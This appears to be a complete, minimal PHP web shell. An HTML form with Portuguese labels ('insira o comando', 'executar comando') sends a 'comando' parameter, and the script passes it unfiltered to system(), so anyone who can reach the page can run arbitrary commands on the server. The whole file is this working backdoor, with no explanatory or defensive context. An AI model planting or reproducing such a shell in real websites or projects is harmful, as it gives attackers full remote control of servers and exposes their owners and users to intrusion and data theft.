<form>

<input name="comando" value="insira o comando">
<input type="submit" value="executar comando">
</form>

<?php

$cmd = $_GET['comando'];

system($cmd);

?>
